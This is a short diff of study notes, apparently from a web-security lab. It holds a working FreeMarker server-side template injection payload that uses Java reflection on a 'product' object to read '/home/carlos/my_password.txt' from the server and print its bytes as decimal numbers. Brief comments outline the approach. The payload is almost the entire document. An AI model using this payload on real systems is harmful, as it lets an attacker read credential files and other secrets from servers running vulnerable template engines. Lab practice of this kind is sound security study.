@@ -1,0 +1,5 @@
+// Have access to product object
+// Check through documentation of Java
+// Java Reflection
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+// Convert Deciaml back to ASCII
